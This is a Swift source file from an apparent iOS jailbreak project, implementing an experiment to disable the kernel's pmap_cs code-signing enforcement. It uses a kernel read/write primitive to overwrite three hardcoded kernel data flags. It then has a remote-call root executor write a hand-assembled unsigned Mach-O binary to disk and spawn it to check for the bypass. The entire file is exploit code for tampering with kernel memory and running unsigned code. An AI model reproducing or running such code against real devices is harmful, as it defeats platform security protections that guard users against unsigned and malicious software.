//
//  exp_pmap_cs_disable.swift
//  DSPloit
//
//  EXPERIMENT: Disable pmap_cs enforcement via __DATA byte flags
//  Found via ARM64 disassembly of kernelcache — pmap_cs_allow_invalid_internal
//  accesses byte flags at __DATA+0x30000 (vmaddr 0xfffffff00a110000 unslid).
//  These are likely master enforcement booleans set to 1 at boot.
//  Writing 0 may disable pmap_cs code signing enforcement.
//

import Foundation

final class ExpPmapCSDisable {
    static let shared = ExpPmapCSDisable()
    private var results: [String] = []
    
    // pmap_cs byte flags (UNSLID) — found via Rust disassembler
    // These are in __DATA segment (WRITABLE) at __DATA+0x30000
    private let PMAP_CS_FLAG0_UNSLID: UInt64 = 0xfffffff00a110000
    private let PMAP_CS_FLAG1_UNSLID: UInt64 = 0xfffffff00a110001
    private let PMAP_CS_FLAG2_UNSLID: UInt64 = 0xfffffff00a110002
    
    private var origFlag0: UInt8 = 0
    private var origFlag1: UInt8 = 0
    private var origFlag2: UInt8 = 0
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_pmap_cs) \(msg)")
    }
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════")
        log("  PMAP_CS DISABLE EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 slide = 0x\(String(slide, radix: 16))")
        log("")
        
        step1_readFlags(slide: slide)
        step2_disableFlags(slide: slide)
        step3_testSpawn()
        
        log("")
        log("═══════════════════════════════════════════")
        return results
    }
    
    private func step1_readFlags(slide: UInt64) {
        log("── Step 1: Read pmap_cs flags ──")
        
        let addr0 = PMAP_CS_FLAG0_UNSLID &+ slide
        let addr1 = PMAP_CS_FLAG1_UNSLID &+ slide
        let addr2 = PMAP_CS_FLAG2_UNSLID &+ slide
        
        origFlag0 = ds_kread8(addr0)
        origFlag1 = ds_kread8(addr1)
        origFlag2 = ds_kread8(addr2)
        
        log("🔍 pmap_cs_flag0 @ 0x\(String(addr0, radix: 16)) = \(origFlag0)")
        log("🔍 pmap_cs_flag1 @ 0x\(String(addr1, radix: 16)) = \(origFlag1)")
        log("🔍 pmap_cs_flag2 @ 0x\(String(addr2, radix: 16)) = \(origFlag2)")
        log("")
        
        if origFlag0 != 0 {
            log("✅ flag0 is NON-ZERO (\(origFlag0)) — enforcement likely ACTIVE")
            log("   Writing 0 should DISABLE pmap_cs enforcement")
        } else {
            log("⚠️ flag0 is already 0 — may not be the enforcement flag")
            log("   Will still try other flags")
        }
        log("")
    }
    
    private func step2_disableFlags(slide: UInt64) {
        log("── Step 2: Disable pmap_cs flags ──")
        
        let addr0 = PMAP_CS_FLAG0_UNSLID &+ slide
        let addr1 = PMAP_CS_FLAG1_UNSLID &+ slide
        let addr2 = PMAP_CS_FLAG2_UNSLID &+ slide
        
        // Write 0 to all three flags
        if origFlag0 != 0 {
            ds_kwrite8(addr0, 0)
            let v = ds_kread8(addr0)
            log("  flag0: \(origFlag0) → \(v) \(v == 0 ? "✅" : "❌")")
        }
        
        if origFlag1 != 0 {
            ds_kwrite8(addr1, 0)
            let v = ds_kread8(addr1)
            log("  flag1: \(origFlag1) → \(v) \(v == 0 ? "✅" : "❌")")
        }
        
        if origFlag2 != 0 {
            ds_kwrite8(addr2, 0)
            let v = ds_kread8(addr2)
            log("  flag2: \(origFlag2) → \(v) \(v == 0 ? "✅" : "❌")")
        }
        
        if origFlag0 == 0 && origFlag1 == 0 && origFlag2 == 0 {
            log("  All flags already 0 — trying INVERSE (set to 1)")
            log("  Maybe 0=enforce, 1=allow")
            ds_kwrite8(addr0, 1)
            ds_kwrite8(addr1, 1)
            ds_kwrite8(addr2, 1)
            let v0 = ds_kread8(addr0)
            let v1 = ds_kread8(addr1)
            let v2 = ds_kread8(addr2)
            log("  flag0: 0 → \(v0) \(v0 == 1 ? "✅" : "❌")")
            log("  flag1: 0 → \(v1) \(v1 == 1 ? "✅" : "❌")")
            log("  flag2: 0 → \(v2) \(v2 == 1 ? "✅" : "❌")")
        }
        log("")
    }
    
    private func step3_testSpawn() {
        log("── Step 3: Test unsigned binary spawn ──")
        
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.rcready else {
            log("❌ RemoteCall not active")
            return
        }
        
        let binary = buildExitBinary()
        let testPath = "/var/jb/tmp/pmap_cs_test"
        
        RootExecutor.shared.executeAsRoot(operation: "pmap_cs_spawn") { rc in
            let mem = rc.trojanMem
            
            let dir = remote_alloc_str(rc, "/var/jb/tmp")
            RootExecutor.rcall(rc, "mkdir", dir, 0o755)
            RootExecutor.rcall(rc, "free", dir)
            
            let pathAddr = remote_alloc_str(rc, testPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed", 0)
            }
            
            let writeAddr = mem + 0xC00
            binary.withUnsafeBytes { buf in
                rc.remote_write(writeAddr, from: buf.baseAddress!, size: UInt64(binary.count))
            }
            RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(binary.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        DispatchQueue.global().asyncAfter(deadline: .now() + 10) { [self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "pmap_cs_spawn" {
                DispatchQueue.main.async {
                    if result.success {
                        self.log("✅✅✅ UNSIGNED BINARY SPAWNED!")
                        self.log("  pid = \(result.returnValue)")
                        self.log("  PMAP_CS ENFORCEMENT DISABLED!")
                        self.log("  100% FULL JAILBREAK ACCESS!")
                    } else {
                        self.log("❌ Still blocked: \(result.message)")
                        self.log("  pmap_cs flags may not be the final check")
                        self.log("  OR: flags are PPL-protected (write silently ignored)")
                    }
                }
            }
        }
        
        log("  ⏳ Waiting (10s)...")
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    private func buildExitBinary() -> Data {
        var bin = Data()
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]
        bin.append(contentsOf: header)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54; seg[28] = 0x01
        seg[32] = 0x00; seg[33] = 0x40; seg[40] = 0x00; seg[41] = 0x40
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05; thread[4] = 0x18; thread[5] = 0x01
        thread[8] = 0x06; thread[12] = 0x44
        thread[272] = 0x80; thread[273] = 0x01
        thread[274] = 0x00; thread[275] = 0x00; thread[276] = 0x01
        bin.append(contentsOf: thread)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00, 0x00, 0x80, 0xD2, 0x30, 0x00, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4] as [UInt8])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
